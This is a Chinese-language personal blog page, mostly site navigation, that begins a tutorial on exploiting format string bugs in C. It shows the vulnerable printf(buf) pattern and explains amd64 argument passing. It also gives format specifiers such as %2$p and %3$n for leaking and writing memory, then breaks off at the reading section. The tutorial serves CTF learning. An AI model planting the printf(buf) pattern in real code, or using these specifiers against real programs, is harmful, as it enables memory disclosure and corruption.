
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
      <link rel="shortcut icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.1.5">
    
    
      
        <title>Format String - frozenkp's Blog</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.21aed14c.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.196e0c26.min.css">
        
          
          
          <meta name="theme-color" content="#ff6e42">
        
      
    
    
    
      
        
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
      
    
    
    
    
      
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="deep-orange" data-md-color-accent="">
      
  
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#format-string" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid" aria-label="Header">
    <a href="../.." title="frozenkp&#39;s Blog" class="md-header-nav__button md-logo" aria-label="frozenkp's Blog">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 12h7c-.53 4.11-3.28 7.78-7 8.92V12H5V6.3l7-3.11M12 1L3 5v6c0 5.55 3.84 10.73 9 12 5.16-1.27 9-6.45 9-12V5l-9-4z"/></svg>

    </a>
    <label class="md-header-nav__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header-nav__title" data-md-component="header-title">
      
        <div class="md-header-nav__ellipsis">
          <span class="md-header-nav__topic md-ellipsis">
            frozenkp's Blog
          </span>
          <span class="md-header-nav__topic md-ellipsis">
            
              Format String
            
          </span>
        </div>
      
    </div>
    
      <label class="md-header-nav__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header-nav__source">
        
<a href="https://github.com/frozenkp/frozenkp.github.io/" title="Go to repository" class="md-source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    frozenkp/frozenkp
  </div>
</a>
      </div>
    
  </nav>
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          

  

<nav class="md-tabs md-tabs--active" aria-label="Tabs" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        
  <li class="md-tabs__item">
    
    
    <a href="../.." class="md-tabs__link">
      HOME
    </a>
  </li>

      
        
  
  
    
    
  
  
    
    
  
  
    <li class="md-tabs__item">
      
      
      <a href="../../Writeups/2014/NoConName_qual/inBINcible/" class="md-tabs__link">
        Writeups
      </a>
    </li>
  

  

  

      
        
  
  
    <li class="md-tabs__item">
      
      
        
      
      <a href="../stack_migration/" class="md-tabs__link md-tabs__link--active">
        Pwn
      </a>
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
      
      <a href="../../reverse/radare2/" class="md-tabs__link">
        Reverse
      </a>
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
      
      <a href="../../tools/docker/" class="md-tabs__link">
        Tools
      </a>
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
      
      <a href="../../algorithm/kdtree/" class="md-tabs__link">
        Algorithm
      </a>
    </li>
  

      
        
      
    </ul>
  </div>
</nav>
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="frozenkp&#39;s Blog" class="md-nav__button md-logo" aria-label="frozenkp's Blog">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 12h7c-.53 4.11-3.28 7.78-7 8.92V12H5V6.3l7-3.11M12 1L3 5v6c0 5.55 3.84 10.73 9 12 5.16-1.27 9-6.45 9-12V5l-9-4z"/></svg>

    </a>
    frozenkp's Blog
  </label>
  
    <div class="md-nav__source">
      
<a href="https://github.com/frozenkp/frozenkp.github.io/" title="Go to repository" class="md-source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    frozenkp/frozenkp
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href="../.." class="md-nav__link">
      HOME
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
    <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" >
    <label class="md-nav__link" for="nav-2">
      Writeups
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Writeups" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        <span class="md-nav__icon md-icon"></span>
        Writeups
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
    <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-1" type="checkbox" id="nav-2-1" >
    <label class="md-nav__link" for="nav-2-1">
      2014
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="2014" data-md-level="2">
      <label class="md-nav__title" for="nav-2-1">
        <span class="md-nav__icon md-icon"></span>
        2014
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
    <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-1-1" type="checkbox" id="nav-2-1-1" >
    <label class="md-nav__link" for="nav-2-1-1">
      NoConName qual
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="NoConName qual" data-md-level="3">
      <label class="md-nav__title" for="nav-2-1-1">
        <span class="md-nav__icon md-icon"></span>
        NoConName qual
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../Writeups/2014/NoConName_qual/inBINcible/" class="md-nav__link">
      inBINcible
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
    <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-2" type="checkbox" id="nav-2-2" >
    <label class="md-nav__link" for="nav-2-2">
      2015
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="2015" data-md-level="2">
      <label class="md-nav__title" for="nav-2-2">
        <span class="md-nav__icon md-icon"></span>
        2015
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
    <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-2-1" type="checkbox" id="nav-2-2-1" >
    <label class="md-nav__link" for="nav-2-2-1">
      B-Sides Vancouver
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="B-Sides Vancouver" data-md-level="3">
      <label class="md-nav__title" for="nav-2-2-1">
        <span class="md-nav__icon md-icon"></span>
        B-Sides Vancouver
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../Writeups/2015/B-Sides_Vancouver/Delphi/" class="md-nav__link">
      Delphi
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
    <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-3" type="checkbox" id="nav-2-3" >
    <label class="md-nav__link" for="nav-2-3">
      2017
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="2017" data-md-level="2">
      <label class="md-nav__title" for="nav-2-3">
        <span class="md-nav__icon md-icon"></span>
        2017
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
    <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-3-1" type="checkbox" id="nav-2-3-1" >
    <label class="md-nav__link" for="nav-2-3-1">
      HITB CTF
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="HITB CTF" data-md-level="3">
      <label class="md-nav__title" for="nav-2-3-1">
        <span class="md-nav__icon md-icon"></span>
        HITB CTF
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../Writeups/2017/HITB_CTF/2017_Dating_in_Singapore/" class="md-nav__link">
      2017, Dating in Singapore
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../Writeups/2017/HITB_CTF/Flying_High/" class="md-nav__link">
      Flying_High
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../Writeups/2017/HITB_CTF/Pasty/" class="md-nav__link">
      Pasty
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
    <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-3-2" type="checkbox" id="nav-2-3-2" >
    <label class="md-nav__link" for="nav-2-3-2">
      seccon CTF
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="seccon CTF" data-md-level="3">
      <label class="md-nav__title" for="nav-2-3-2">
        <span class="md-nav__icon md-icon"></span>
        seccon CTF
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../Writeups/2017/seccon_CTF/Qubic_Rube/" class="md-nav__link">
      Qubic Rube
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../Writeups/2017/seccon_CTF/putchar_music/" class="md-nav__link">
      putchar music
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
    <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-4" type="checkbox" id="nav-2-4" >
    <label class="md-nav__link" for="nav-2-4">
      2018
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="2018" data-md-level="2">
      <label class="md-nav__title" for="nav-2-4">
        <span class="md-nav__icon md-icon"></span>
        2018
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
    <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-4-1" type="checkbox" id="nav-2-4-1" >
    <label class="md-nav__link" for="nav-2-4-1">
      BambooFox CTF
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="BambooFox CTF" data-md-level="3">
      <label class="md-nav__title" for="nav-2-4-1">
        <span class="md-nav__icon md-icon"></span>
        BambooFox CTF
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../Writeups/2018/BambooFox_CTF/water-impossible/" class="md-nav__link">
      water-impossible
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../Writeups/2018/BambooFox_CTF/infant-gotoheaven/" class="md-nav__link">
      infant-gotoheaven
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../Writeups/2018/BambooFox_CTF/infant-gogogo/" class="md-nav__link">
      infant-gogogo
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
    <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-4-2" type="checkbox" id="nav-2-4-2" >
    <label class="md-nav__link" for="nav-2-4-2">
      ASIS CTF qual
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="ASIS CTF qual" data-md-level="3">
      <label class="md-nav__title" for="nav-2-4-2">
        <span class="md-nav__icon md-icon"></span>
        ASIS CTF qual
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../Writeups/2018/ASIS_CTF_qual/Plastic/" class="md-nav__link">
      Plastic
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../Writeups/2018/ASIS_CTF_qual/Trashy_Or_Classy/" class="md-nav__link">
      Trashy Or Classy
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../Writeups/2018/ASIS_CTF_qual/Buy_flags/" class="md-nav__link">
      Buy flags
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
    <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-5" type="checkbox" id="nav-2-5" >
    <label class="md-nav__link" for="nav-2-5">
      Others
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Others" data-md-level="2">
      <label class="md-nav__title" for="nav-2-5">
        <span class="md-nav__icon md-icon"></span>
        Others
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
    <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-5-1" type="checkbox" id="nav-2-5-1" >
    <label class="md-nav__link" for="nav-2-5-1">
      pwnable.tw
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="pwnable.tw" data-md-level="3">
      <label class="md-nav__title" for="nav-2-5-1">
        <span class="md-nav__icon md-icon"></span>
        pwnable.tw
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../Writeups/Others/pwnable.tw/Start/" class="md-nav__link">
      Start
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../Writeups/Others/pwnable.tw/orw/" class="md-nav__link">
      orw
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../Writeups/Others/pwnable.tw/hacknote/" class="md-nav__link">
      hacknote
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../Writeups/Others/pwnable.tw/dubblesort/" class="md-nav__link">
      dubblesort
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../Writeups/Others/pwnable.tw/criticalheap/" class="md-nav__link">
      criticalheap
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
    <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" checked>
    <label class="md-nav__link" for="nav-3">
      Pwn
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Pwn" data-md-level="1">
      <label class="md-nav__title" for="nav-3">
        <span class="md-nav__icon md-icon"></span>
        Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../stack_migration/" class="md-nav__link">
      Stack Migration
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
      
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Format String
        <span class="md-nav__icon md-icon"></span>
      </label>
    
    <a href="./" class="md-nav__link md-nav__link--active">
      Format String
    </a>
    
      
<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#printf" class="md-nav__link">
    printf 參數
  </a>
  
    <nav class="md-nav" aria-label="printf 參數">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    直接指定參數
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    讀取
  </a>
  
    <nav class="md-nav" aria-label="讀取">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#p" class="md-nav__link">
    %p
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#s" class="md-nav__link">
    %s
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    寫入
  </a>
  
    <nav class="md-nav" aria-label="寫入">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    寫入的值
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    寫入的長度
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#argv-chain" class="md-nav__link">
    argv chain
  </a>
  
    <nav class="md-nav" aria-label="argv chain">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#argv1-2-bytes" class="md-nav__link">
    第一步：透過 argv1 寫 2 bytes
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#argv0-2" class="md-nav__link">
    第二步：透過 argv0 移動 2
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#argv1-2-bytes_1" class="md-nav__link">
    第三步：透過 argv1 寫 2 bytes
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#argv0" class="md-nav__link">
    第四步：透過 argv0 移動回來
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#argv2-0xdeadbeef" class="md-nav__link">
    第五步：透過 argv2 寫入 0xdeadbeef
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_printf_chk" class="md-nav__link">
    _printf_chk
  </a>
  
</li>
      
    </ul>
  
</nav>
    
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
    <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" >
    <label class="md-nav__link" for="nav-4">
      Reverse
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Reverse" data-md-level="1">
      <label class="md-nav__title" for="nav-4">
        <span class="md-nav__icon md-icon"></span>
        Reverse
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/radare2/" class="md-nav__link">
      radare2
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/go/" class="md-nav__link">
      Go
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
    <input class="md-nav__toggle md-toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5" >
    <label class="md-nav__link" for="nav-5">
      Tools
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Tools" data-md-level="1">
      <label class="md-nav__title" for="nav-5">
        <span class="md-nav__icon md-icon"></span>
        Tools
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../tools/docker/" class="md-nav__link">
      Docker
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
    <input class="md-nav__toggle md-toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6" >
    <label class="md-nav__link" for="nav-6">
      Algorithm
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Algorithm" data-md-level="1">
      <label class="md-nav__title" for="nav-6">
        <span class="md-nav__icon md-icon"></span>
        Algorithm
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../algorithm/kdtree/" class="md-nav__link">
      k-d tree
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../about/" class="md-nav__link">
      About
    </a>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#printf" class="md-nav__link">
    printf 參數
  </a>
  
    <nav class="md-nav" aria-label="printf 參數">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    直接指定參數
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    讀取
  </a>
  
    <nav class="md-nav" aria-label="讀取">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#p" class="md-nav__link">
    %p
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#s" class="md-nav__link">
    %s
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    寫入
  </a>
  
    <nav class="md-nav" aria-label="寫入">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    寫入的值
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    寫入的長度
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#argv-chain" class="md-nav__link">
    argv chain
  </a>
  
    <nav class="md-nav" aria-label="argv chain">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#argv1-2-bytes" class="md-nav__link">
    第一步：透過 argv1 寫 2 bytes
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#argv0-2" class="md-nav__link">
    第二步：透過 argv0 移動 2
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#argv1-2-bytes_1" class="md-nav__link">
    第三步：透過 argv1 寫 2 bytes
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#argv0" class="md-nav__link">
    第四步：透過 argv0 移動回來
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#argv2-0xdeadbeef" class="md-nav__link">
    第五步：透過 argv2 寫入 0xdeadbeef
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_printf_chk" class="md-nav__link">
    _printf_chk
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/frozenkp/frozenkp.github.io/edit/master/docs/pwn/format_string.md" title="Edit this page" class="md-content__button md-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
                  </a>
                
                
                <h1 id="format-string">Format String</h1>
<p>format string 是在使用 printf 上的一個漏洞，基本上好像只會在打題目的時候出現 XD</p>
<p>以下是經典的 format string 範例</p>
<div class="highlight"><pre><span></span><code><span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
<span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</code></pre></div>
<p>原本應該由開發者填寫的 format 變成使用者可控的，可以藉由這樣的漏洞達到任意讀取及任意寫入的操作</p>
<h2 id="printf">printf 參數</h2>
<p>一開始要先講的是 <code>printf</code> 的參數，在 <code>amd64</code> 的情況下，如果參數沒有超過 6 個的話會放在 register 上，第 7 個開始才放在 stack 上</p>
<p><code>rdi</code>→<code>rsi</code> → <code>rdx</code> → <code>rcx</code> → <code>r8</code> → <code>r9</code> → <code>stack</code></p>
<p>正常使用 <code>printf</code> 時：</p>
<div class="highlight"><pre><span></span><code><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%d%c%s&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span>  <span class="n">b</span><span class="p">,</span>  <span class="n">c</span><span class="p">);</span>
          <span class="o">|</span>      <span class="o">|</span>   <span class="o">|</span>   <span class="o">|</span>
         <span class="n">rdi</span>    <span class="n">rsi</span> <span class="n">rdx</span> <span class="n">rcx</span>
</code></pre></div>
<p>在使用 fromat string 時，<code>rdi</code> 是自己的 payload，而第一個 <code>%</code> 代表的是 <code>rsi</code>，如果想要動到 stack 上的東西就要從第 6 個 <code>%</code> 開始</p>
<h3 id="_1">直接指定參數</h3>
<p>可以使用 <code>%x$y</code> 直接指定第幾個參數，這邊的 <code>x</code> 是第幾個參數，<code>y</code> 則是要使用的方法</p>
<div class="highlight"><pre><span></span><code><span class="o">%</span><span class="mi">2</span><span class="err">$</span><span class="n">p</span>          <span class="c1">// 印出 rdx (第 2 個參數)</span>
<span class="o">%</span><span class="mi">3</span><span class="err">$</span><span class="n">n</span>          <span class="c1">// 寫入 rcx (第 3 個參數)</span>
</code></pre></div>
<h2 id="_2">讀取</h2>
